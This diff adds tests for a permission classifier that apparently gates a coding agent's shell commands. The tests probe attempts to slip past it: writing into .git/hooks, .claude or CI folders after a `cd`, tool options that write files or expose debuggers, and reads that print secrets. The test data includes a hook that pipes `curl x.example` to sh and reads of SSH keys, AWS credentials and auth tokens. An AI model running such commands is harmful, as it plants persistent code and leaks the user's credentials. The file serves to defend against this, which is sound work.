@@ -4,9 +4,10 @@
 // line it imitates, which still reads as it did, so ordinary reads do not start asking. Curl is the one deliberate change:
 // reaching the network is no longer a read.
 import { describe, expect, it } from "vitest";
-import { kitDecide, type KitAction } from "@manut/member-grants";
-import { readCommand, type Where } from "./command";
-import { ON_THIS_MAC } from "./ask";
+import { kitDecide, type KitAction, type KitLevel } from "@manut/member-grants";
+import { foldersAfter, readCommand, type Rule, type Where } from "./command";
+import { ON_THIS_MAC, decideAsk } from "./ask";
+import { emptyProject } from "./project";
 
 const root = "/Users/fon/baanmali-preorder";
 const at: Where = { cwd: root, root, home: "/Users/fon", branch: "kit/promptpay-qr" };
@@ -241,7 +242,7 @@ describe("A3: git, which takes any start of a long option's name", () => {
       ["git tag -n -a v1 -m x", "git tag -n", "read"],
       ["git tag -l -f v1", "git tag -l", "read"],
       ["git config --unset core.hooksPath", "git config --get core.hooksPath", "read"],
-      ["git config --edit", "git config --list", "read"],
+      ["git config --edit", "git config --local --list", "read"],
       ["git config --remove-section remote.origin", "git config --get remote.origin.url", "read"],
       ["git config --unset-all core.pager", "git config user.name", "read"],
       ["git config --file=../x/config --list", "git config --local --list", "read"],
@@ -327,7 +328,7 @@ describe("B1: a command with several actions, or a word read as the first of its
       ["docker compose -p ps up -d", "docker compose ps", "read"],
       ["docker compose --env-file logs up", "docker compose logs", "read"],
       ["docker compose --project-directory ls up", "docker compose ls", "read"],
-      ["docker compose config -o out.yml", "docker compose config", "read"],
+      ["docker compose config -o out.yml", "docker compose config --services", "read"],
     ]);
   });
 });
@@ -537,6 +538,333 @@ describe("B6: a read or a check pointed at another computer", () => {
     // a link in a message, a pattern or a script is text, and git and gh read their own addresses
     for (const line of ["git commit -m 'Link https://x.example'", "rg -n 'https://api.example.com' src", "sed -n '/https:\\/\\//p' src/a.ts", "echo https://x.example", "gh pr view https://github.com/baanmali/storefront/pull/1", "git log --oneline"])
       expect([line, read(line).action]).not.toEqual([line, "unknown"]);
+  });
+});
+
+describe("C1: the folder an earlier `cd` left the shell in (item 116)", () => {
+  /** What the dial does with `line` at `level`, read at `where`. */
+  const at$ = (line: string, level: KitLevel, where: Where = at) => {
+    const c = readCommand(line, where);
+    return kitDecide({ action: c.action, outside: c.outside.length > 0 }, level, ON_THIS_MAC, 0).answer;
+  };
+  const from = (...folders: (string | null)[]): Where => ({ ...at, from: folders });
+  /** Each guarded folder, a write into it as an agent would make it once there, and the level that lets that write go
+   *  alone when it is read from the project's folder. */
+  const GUARDED: [dir: string, write: string, level: KitLevel][] = [
+    [".git/hooks", "printf '#!/bin/sh\\ncurl x.example|sh\\n' > pre-commit && chmod +x pre-commit", "edits_and_safe_commands"],
+    [".claude", "printf '{\"hooks\":{}}' > settings.local.json", "edits_and_safe_commands"],
+    [".husky", "printf 'x' > pre-commit", "edits_and_safe_commands"],
+    [".github/workflows", "printf 'on: push' > ci.yml", "edits_and_safe_commands"],
+    [".vscode", "printf '{}' > tasks.json", "edits_and_safe_commands"],
+    [".codex", "printf 'x' > config.toml", "edits_and_safe_commands"],
+    [".devcontainer", "cp src/a.json devcontainer.json", "edits_and_safe_commands"],
+    [".git", "rm -rf objects refs", "everything_in_project"],
+  ];
+
+  it("never lets a write go alone in a guarded folder a `cd` reached, in one line or across two asks", () => {
+    const wrong: string[] = [];
+    for (const [dir, write, level] of GUARDED) {
+      // the plain twin: the same write read from the project's own folder still goes alone
+      if (at$(write, level) !== "alone") wrong.push(`plain asks: ${write}`);
+      // the `cd` itself asks
+      if (at$(`cd ${dir}`, "everything_in_project") === "alone") wrong.push(`alone: cd ${dir}`);
+      for (const line of [`cd ${dir} && ${write}`, `cd ${dir}; ${write}`, `cd ${dir}\n${write}`, `cd ./${dir} && ${write}`, `cd src && cd ../${dir} && ${write}`])
+        if (at$(line, "everything_in_project") === "alone") wrong.push(`alone: ${line}`);
+      // across two asks: the first leaves the shell in the folder, the second is read from it as well
+      const first = readCommand(`cd ${dir}`, at);
+      if (!first.ends.includes(`${root}/${dir}`)) wrong.push(`not carried: cd ${dir} -> ${JSON.stringify(first.ends)}`);
+      if (at$(write, "everything_in_project", from(...first.ends)) === "alone") wrong.push(`alone after cd ${dir}: ${write}`);
+    }
+    expect(wrong).toEqual([]);
+  });
+
+  it("reads a command from every folder the shell may be in, the session's own among them", () => {
+    counted += holds([
+      // a `cd` that fails leaves the shell where it was, and `;` or `||` runs the next command there
+      ["cd x; cat ../.ssh/id_rsa", "cd src && cat ../package.json", "read"],
+      ["cd x || cat ../.ssh/id_rsa", "cd src && cat package.json", "read"],
+      ["cd x\ncat ../.ssh/id_rsa", "cd src && ls", "read"],
+      ["test -d .git/hooks && cd .git/hooks; printf x > pre-commit", "test -d src && cd src && ls", "read"],
+      ["cd ~fon", "cd src", "read"],
+      ["cd ~nobody/x", "cd apps/desktop", "read"],
+      ["cd +1", "cd -P src", "read"],
+      ["cd -2", "cd -L src", "read"],
+      ["cd src lib", "cd src/code", "read"],
+      ["cd -", "cd .", "read"],
+      ["pushd .git/hooks", "cd ./src", "read"],
+      ["chdir .git/hooks", "cd src/", "read"],
+    ]);
+    // the session's own folder is read too, so a shell that went back to it is never missed
+    expect(readCommand("cat ../.ssh/id_rsa", from(`${root}/src`)).outside).toEqual(["../.ssh/id_rsa"]);
+    expect(readCommand("cat package.json", from(`${root}/src`))).toMatchObject({ action: "read", outside: [] });
+  });
+
+  it("asks for everything but a plain read once the folder cannot be known, until a `cd` to the project's folder", () => {
+    for (const line of ["cd -", "pushd src", "popd", "(cd .git/hooks; ls)", "source ./x.sh", ". ./x.sh", "eval cd x", "cd src && echo $(pwd)"]) expect([line, readCommand(line, at).ends.includes(null)]).toEqual([line, true]);
+    const lost = from(null);
+    for (const line of ["printf x > a.txt", "mkdir src/qr", "pnpm test", "ls", "cat package.json", "git status", "cat .git/config"]) expect([line, at$(line, "everything_in_project", lost)]).toEqual([line, "ask"]);
+    for (const line of ["pwd", "echo done", "date"]) expect([line, at$(line, "asks_every_time", lost)]).toEqual([line, "alone"]);
+    // a `cd` to a folder written in full gives the rest of the line a folder again
+    expect(at$(`cd ${root} && printf x > a.txt`, "edits_and_safe_commands", lost)).toBe("alone");
+    expect(at$(`cd ${root} && printf x > .git/hooks/pre-commit`, "everything_in_project", lost)).toBe("ask");
+    // and a command that is only that `cd` sets the session's folder again
+    const back = readCommand(`cd ${root}`, lost);
+    expect(foldersAfter([null], back)).toEqual([root]);
+    expect(foldersAfter([null], readCommand(`cd ${root} && pnpm test`, lost))).toContain(null);
+  });
+
+  it("keeps every folder the shell may be in for the session's next command, and stops counting past a limit", () => {
+    expect(foldersAfter([], readCommand("cd src && pnpm test", at))).toEqual(expect.arrayContaining([`${root}/src`]));
+    expect(foldersAfter([`${root}/a`], readCommand("git status", at))).toEqual(expect.arrayContaining([`${root}/a`]));
+    let folders: (string | null)[] = [];
+    for (let i = 0; i < 40; i++) folders = foldersAfter(folders, readCommand(`cd d${i}`, at));
+    expect(folders).toEqual([null]);
+  });
+});
+
+describe("C2: a check or a read with an option its own list does not hold (item 116)", () => {
+  it("is never a check or a read: it asks, or it is the change it makes", () => {
+    counted += holds([
+      // pip and uv: a log file it appends to, an interpreter it runs
+      ["pip list --python scripts/deploy.sh", "pip list", "read"],
+      ["pip3 show requests --python=./bin/release", "pip3 show requests", "read"],
+      ["python3 -m pip list --python scripts/deploy.sh", "python3 -m pip list", "read"],
+      ["pip list --log .git/hooks/pre-commit", "pip list --outdated", "read"],
+      ["pip show 'x\nany text' --log CLAUDE.md", "pip show -f requests", "read"],
+      ["pip freeze --log .husky/pre-commit", "pip freeze --all", "read"],
+      ["pip list --log=notes.txt", "pip list --format=json", "read"],
+      ["pip freeze -r requirements.txt", "pip freeze -l", "read"],
+      ["pip list --cache-dir=.claude", "pip list --not-required", "read"],
+      ["uv pip list --python scripts/deploy.sh", "uv pip list --outdated", "read"],
+      ["uv pip list --directory sub", "uv pip list --format=json", "read"],
+      ["uv pip show --python ./x requests", "uv pip show requests", "read"],
+      // mypy: reports it writes, an interpreter it runs, stubs it installs, a cache it writes
+      ["mypy --python-executable scripts/deploy.sh src", "mypy src", "check"],
+      ["mypy --html-report public src", "mypy --strict src", "check"],
+      ["mypy --txt-report .claude src", "mypy --ignore-missing-imports src", "check"],
+      ["mypy --install-types --non-interactive src", "mypy --pretty src", "check"],
+      ["python3 -m mypy --python-executable=./x src", "python3 -m mypy src", "check"],
+      ["mypy --linecount-report out src", "mypy --python-version 3.12 src", "check"],
+      ["mypy --cache-dir .claude src", "mypy --no-incremental src", "check"],
+      ["mypy --shadow-file a.py b.py src", "mypy -p app", "check"],
+      ["mypy --custom-typeshed-dir x src", "mypy --exclude build src", "check"],
+      // ruff: fixes it writes, a cache, a subcommand that is no check
+      ["ruff check --fix-only src", "ruff check src", "check"],
+      ["ruff check --add-noqa src", "ruff check --select E501 src", "check"],
+      ["ruff check --unsafe-fixes --fix-only src", "ruff check --statistics src", "check"],
+      ["ruff check --cache-dir .claude src", "ruff check --no-cache src", "check"],
+      ["ruff clean", "ruff format --check src", "check"],
+      ["ruff server", "ruff check --output-format=json src", "check"],
+      // pytest: a debug log, a cache it clears, a debugger, modules by name
+      ["pytest --debug=.husky/pre-commit", "pytest -x -q", "check"],
+      ["pytest --debug .claude/settings.local.json", "pytest -k checkout", "check"],
+      ["pytest --cache-clear", "pytest --lf", "check"],
+      ["pytest --pyargs requests", "pytest -m slow", "check"],
+      ["pytest --pdb", "pytest --tb=short", "check"],
+      ["pytest --log-file=notes.log", "pytest --log-level=INFO", "check"],
+      ["pytest --rootdir=tests", "pytest --durations=5", "check"],
+      ["pytest --confcutdir=tests", "pytest --collect-only", "check"],
+      // pyright and pylint: no list of pyright's options was read; pylint's output format can name a file
+      ["pyright --pythonpath scripts/deploy.sh", "pyright", "check"],
+      ["pyright --writebaseline", "pyright src", "check"],
+      ["pylint --output-format=text:.husky/pre-commit src", "pylint --disable=C src", "check"],
+      ["pylint --output-format=json:CLAUDE.md src", "pylint -d C0114 src", "check"],
+      ["pylint --rcfile=x src", "pylint -j 0 src", "check"],
+      // vitest and mocha: a debugger on an address, a program it runs, a file it writes, a server it opens
+      ["npx vitest run --inspect=0.0.0.0:9229", "npx vitest run --coverage", "check"],
+      ["npx vitest run --inspect-brk=0.0.0.0:9229", "npx vitest run --silent", "check"],
+      ["npx vitest run --inspectBrk=127.0.0.1:9339", "npx vitest run --passWithNoTests", "check"],
+      ["npx mocha --inspect=0.0.0.0:9229", "npx mocha --exit test", "check"],
+      ["npx vitest run --typecheck --typecheck.checker=scripts/deploy.sh", "npx vitest run --typecheck", "check"],
+      ["npx vitest list --json=.husky/pre-commit", "npx vitest list --filesOnly", "check"],
+      ["npx vitest init browser", "npx vitest related src/a.ts", "check"],
+      ["npx vitest run --browser.enabled", "npx vitest run --project=unit", "check"],
+      ["npx vitest run --ui", "npx vitest run --maxWorkers=2", "check"],
+      ["npx vitest run --attachmentsDir=.claude", "npx vitest run --retry=2", "check"],
+      ["npx vitest run --mergeReports", "npx vitest run --bail=1", "check"],
+      ["npx mocha --reporter xunit --reporter-option output=.husky/pre-commit", "npx mocha --grep checkout test", "check"],
+      ["npx mocha --reporter xunit -O output=CLAUDE.md", "npx mocha -g checkout", "check"],
+      ["npx mocha --file ./x.js", "npx mocha --forbid-only test", "check"],
+      ["npx tap --node-arg=--require=./x.js", "npx tap", "check"],
+      // jest and eslint
+      ["npx jest --coverageReporters=./x.js", "npx jest --ci", "check"],
+      ["npx jest --filter=./x.js", "npx jest --onlyChanged", "check"],
+      ["npx jest --clearCache", "npx jest --listTests", "check"],
+      ["npx jest --projects ./x", "npx jest -i", "check"],
+      ["eslint --init", "eslint --max-warnings 0 src", "check"],
+      ["eslint --inspect-config", "eslint --quiet src", "check"],
+      ["npx eslint --parser ./x.js src", "npx eslint --ext .ts src", "check"],
+      ["npx eslint --suppress-all src", "npx eslint --no-warn-ignored src", "check"],
+      ["npx eslint --mcp", "npx eslint --stats src", "check"],
+      ["npx eslint --cache-location=.claude src", "npx eslint --cache src", "check"],
+      // tsc: a build info file it writes
+      ["tsc --noEmit --incremental", "tsc --noEmit --skipLibCheck", "check"],
+      ["tsc --noEmit --composite", "tsc --noEmit --noUnusedLocals", "check"],
+      ["tsc --noEmit --plugins x", "tsc --noEmit --target es2022", "check"],
+      // biome and cspell: no list was read, so any option asks; a subcommand that is no check asks
+      ["npx biome init", "npx biome check src", "check"],
+      ["npx biome migrate", "npx biome lint src", "check"],
+      ["npx cspell --file-list stdin", "npx cspell src/a.ts", "check"],
+      ["echo /Users/fon/.aws/credentials | npx cspell --file-list stdin --show-context", "npx cspell lint src", "check"],
+      // a framework's lint, turbo and nx: options handed on to a linter
+      ["next lint --fix", "next lint", "check"],
+      ["next lint --output-file=.husky/pre-commit", "pnpm exec next lint", "check"],
+      ["pnpm exec next lint --fix", "npx next lint", "check"],
+      ["turbo run lint -- --fix", "turbo run lint", "check"],
+      ["turbo lint --fix", "turbo lint", "check"],
+      ["turbo run test --graph=x.html", "turbo run test -F web", "check"],
+      ["nx run web:lint --fix", "nx run web:lint", "check"],
+      ["nx lint web --fix", "nx lint web", "check"],
+      // bun's test runner and the words a package manager hands to a test script
+      ["bun test --reporter=junit --reporter-outfile=.husky/pre-commit", "bun test --coverage", "check"],
+      ["bun test --coverage --coverage-dir=.claude", "bun test -t checkout", "check"],
+      ["bun test -r ./x.js", "bun test --silent", "check"],
+      ["pnpm test -- --inspect=0.0.0.0:9229", "pnpm test -- --coverage", "check"],
+      ["pnpm test -- --outputFile=x.json", "pnpm test -- --run", "check"],
+      ["npm test -- --json --outputFile=x", "npm test -- -t checkout", "check"],
+      // go, cargo, shellcheck, actionlint, playwright, prettier
+      ["go test -fuzzcachedir=x ./...", "go test -short ./...", "check"],
+      ["go test -outputdir=.claude ./...", "go test -failfast ./...", "check"],
+      ["go test -args -test.cpuprofile=x ./...", "go test -timeout=30s ./...", "check"],
+      ["go vet -json ./...", "go vet ./pkg", "check"],
+      ["cargo test --target-dir .claude", "cargo test --workspace", "check"],
+      ["cargo check --timings", "cargo check --message-format=json", "check"],
+      ["cargo clippy -m x/Cargo.toml", "cargo clippy --all-targets", "check"],
+      ["shellcheck --rcfile=x scripts/a.sh", "shellcheck -S warning scripts/a.sh", "check"],
+      ["shellcheck -x scripts/a.sh", "shellcheck -f gcc scripts/a.sh", "check"],
+      ["actionlint -pyflakes=./x", "actionlint -oneline", "check"],
+      ["actionlint -config-file x.yaml", "actionlint -color", "check"],
+      ["npx playwright test --ui-host=0.0.0.0", "npx playwright test --headed", "check"],
+      ["npx playwright test --output=.claude", "npx playwright test -x", "check"],
+      ["npx playwright test --trace on", "npx playwright test --workers=2", "check"],
+      ["npx playwright test --tsconfig ./x.json", "npx playwright test --project chromium", "check"],
+      ["npx prettier --check --cache-location=x .", "npx prettier --check --cache .", "check"],
+      // an option's value that is a file a change to which always asks, on a program with no list
+      ["cat --x=.husky/pre-commit a.txt", "cat -n a.txt", "read"],
+      ["diff --to-file=CLAUDE.md a.txt", "diff --to-file=b.txt a.txt", "read"],
+      ["sort --random-source=.claude/settings.local.json a.txt", "sort --random-source=seed.txt a.txt", "read"],
+    ]);
+    // a fix is the change it makes, which a level may let go alone, never a check
+    for (const line of ["ruff check --fix-only src", "ruff check --add-noqa src", "npx eslint --fix src", "cargo clippy --fix"]) expect([line, read(line).action]).toEqual([line, "change"]);
+    // an option that only leaves a folder out is not a file it writes
+    expect(read("grep -rn --exclude-dir=.git foo src").action).toBe("read");
+  });
+});
+
+describe("C3: a kept rule covers only the step it was kept for (item 116)", () => {
+  const project = (rules: Rule[]) => ({ ...emptyProject(), level: "edits_and_safe_commands" as const, rules });
+  const decide = (line: string, rules: Rule[]) => {
+    const c = readCommand(line, at);
+    return decideAsk({ what: "command", action: c.action, outside: c.outside, folder: null, saves: c.saves, rule: c.rule, line, say: c.say }, project(rules), [], 0).answer;
+  };
+  /** The line a rule is kept from, a stricter line that begins with its words, and a line the rule still covers. */
+  const ROWS: [kept: string, stricter: string, covered: string][] = [
+    ["git push origin kit/x", "git push --force origin kit/x", "git push origin kit/y"],
+    ["git push origin kit/x", "git push origin --delete kit/old", "git push -u origin kit/x"],
+    ["git push origin kit/x", "git push -f origin kit/x", "git push origin kit/x"],
+    ["git push origin kit/x", "git push --force-with-lease origin kit/x", "git push origin kit/z"],
+    ["git push origin kit/x", "git push origin +kit/x", "git push origin kit/x"],
+    ["git branch kit/new", "git branch -D kit/promptpay-qr", "git branch kit/other"],
+    ["git branch kit/new", "git branch --delete kit/old", "git branch kit/two"],
+    ["git stash", "git stash clear", "git stash"],
+    ["git stash", "git stash drop", "git stash"],
+    ["git rm --cached src/a.ts", "git rm -r src", "git rm --cached src/b.ts"],
+    ["git switch kit/x", "git switch -f kit/x", "git switch kit/y"],
+    ["git switch kit/x", "git switch --discard-changes kit/x", "git switch kit/z"],
+    ["git remote rename a b", "git remote remove origin", "git remote rename c d"],
+    ["git checkout main", "git checkout -f main", "git checkout kit/x"],
+    ["git reset src/a.ts", "git reset --hard src/a.ts", "git reset src/b.ts"],
+    ["git worktree add kit-x", "git worktree remove kit-x", "git worktree add kit-y"],
+    ["pnpm install", "pnpm install --force", "pnpm install"],
+    ["pnpm add qrcode", "pnpm add -r qrcode", "pnpm add dayjs"],
+  ];
+
+  it("never lets a rule kept from one step cover a stricter step with the same first words", () => {
+    const wrong: string[] = [];
+    for (const [kept, stricter, covered] of ROWS) {
+      const rule = readCommand(kept, at).rule;
+      if (!rule) {
+        wrong.push(`no rule: ${kept}`);
+        continue;
+      }
+      if (decide(stricter, []) === "alone") wrong.push(`alone without a rule: ${stricter}`);
+      if (decide(stricter, [rule]) === "alone") wrong.push(`covered: ${kept} -> ${stricter}`);
+      if (readCommand(covered, at).outside.length === 0 && decide(covered, [rule]) !== "alone") wrong.push(`no longer covered: ${kept} -> ${covered}`);
+    }
+    expect(wrong).toEqual([]);
+  });
+
+  it("reads a rule saved before it named its step as covering only the least strict step its words can mean", () => {
+    const old = (...words: string[]): Rule => ({ words });
+    expect(decide("git push origin kit/x", [old("git", "push")])).toBe("alone");
+    expect(decide("git push --force origin kit/x", [old("git", "push")])).toBe("ask");
+    expect(decide("git push origin --delete kit/old", [old("git", "push")])).toBe("ask");
+    expect(decide("git branch -D kit/x", [old("git", "branch")])).toBe("ask");
+    expect(decide("git stash clear", [old("git", "stash")])).toBe("ask");
+    expect(decide("pnpm add dayjs", [old("pnpm", "add")])).toBe("alone");
+    expect(decide("pnpm add -r dayjs", [old("pnpm", "add")])).toBe("ask");
+    // a new rule names the step it was kept for
+    expect(readCommand("git push origin kit/x", at).rule).toEqual({ words: ["git", "push"], action: "push" });
+  });
+});
+
+describe("C4: a read that prints a secret from outside the project without naming a path (item 116)", () => {
+  it("is read as printenv is: it asks", () => {
+    counted += holds([
+      ["kubectl get secret -o yaml", "kubectl get pods -o yaml", "read"],
+      ["kubectl get secrets -A -o json", "kubectl get pods -A", "read"],
+      ["kubectl describe secret web-tls", "kubectl describe pod web", "read"],
+      ["kubectl get secret/web-tls -o jsonpath='{.data}'", "kubectl get configmap/web -o yaml", "read"],
+      ["kubectl get configmap,secret -n web", "kubectl get configmap,service -n web", "read"],
+      ["terraform output -json", "terraform validate", "read"],
+      ["terraform output db_password", "terraform plan", "read"],
+      ["tofu output -raw token", "tofu validate", "read"],
+      ["docker inspect web", "docker ps", "read"],
+      ["docker inspect --format '{{.Config.Env}}' web", "docker images", "read"],
+      ["docker container inspect web", "docker logs web", "read"],
+      ["docker compose config", "docker compose config --services", "read"],
+      ["git config --list", "git config --local --list", "read"],
+      ["git config -l --show-origin", "git config --get user.name", "read"],
+      ["git config list", "git config get user.email", "read"],
+      ["git var -l", "git var GIT_AUTHOR_IDENT", "read"],
+      ["git config --get-regexp '.*'", "git config --local --get-regexp remote", "read"],
+      ["git config --get github.token", "git config --get core.editor", "read"],
+      ["git config --get-urlmatch http.extraheader https://github.com", "git config --get init.defaultBranch", "read"],
+      ["ps -E -ax", "ps -ax", "read"],
+      ["ps eww -ax", "ps aux", "read"],
+      ["ps -Eww", "ps -ef", "read"],
+      ["ps aeux", "ps -o pid,command -p 1", "read"],
+      ["yq -n 'load(\"/Users/fon/.ssh/id_rsa\")'", "yq -n '.a'", "read"],
+      ["yq -n 'load_str(\"/Users/fon/.aws/credentials\")'", "yq '.a' a.yaml", "read"],
+      ["yq e -n 'env(HOME)'", "yq e '.a' a.yaml", "read"],
+      ["yq eval -n 'load_xml(\"x.xml\")'", "yq eval '.b' a.yaml", "read"],
+      ["yq ea 'strenv(AWS_SECRET_ACCESS_KEY)' a.yaml", "yq ea '.' a.yaml b.yaml", "read"],
+      ["pnpm config get //registry.npmjs.org/:_authToken", "pnpm config get registry", "read"],
+      ["yarn config get npmAuthToken", "yarn config get npmRegistryServer", "read"],
+      ["yarn config get npmRegistryServer --no-redacted", "npm config get save-exact", "read"],
+      ["npm config get _auth", "npm config get registry", "read"],
+      ["pnpm config list", "pnpm config get store-dir", "read"],
+    ]);
+  });
+});
+
+describe("C5: git pointed at another folder, and a program named by a path (item 116)", () => {
+  it("reads git only in the project's own folder, and a tool only from a node_modules/.bin of the project", () => {
+    counted += holds([
+      ["git -C fixtures/evil.git show HEAD", "git show HEAD", "read"],
+      ["git -C x status", "git status", "read"],
+      ["git -C sub/x log --oneline", "git log --oneline", "read"],
+      [`git -C ${root}/x status`, `git -C ${root} status`, "read"],
+      ["git -C . -C x status", "git -C . status", "read"],
+      ["git --git-dir=x log", "git --no-pager log", "read"],
+      ["git --work-tree=x status", "git -P log -1", "read"],
+      ["git --git-dir x --work-tree . diff", "git diff --stat", "read"],
+      ["node_modules/.bin/../../scripts/test", "node_modules/.bin/vitest run", "check"],
+      ["./node_modules/.bin/../../bin/git status", "./node_modules/.bin/vitest run", "check"],
+      ["/tmp/x/node_modules/.bin/vitest run", "apps/desktop/node_modules/.bin/vitest run", "check"],
+      ["fixtures/node_modules/.bin/../x/node_modules/.bin/../../../scripts/test", `${root}/node_modules/.bin/vitest run`, "check"],
+      ["../node_modules/.bin/vitest run", "./node_modules/.bin/tsc --noEmit", "check"],
+    ]);
   });
 });
 
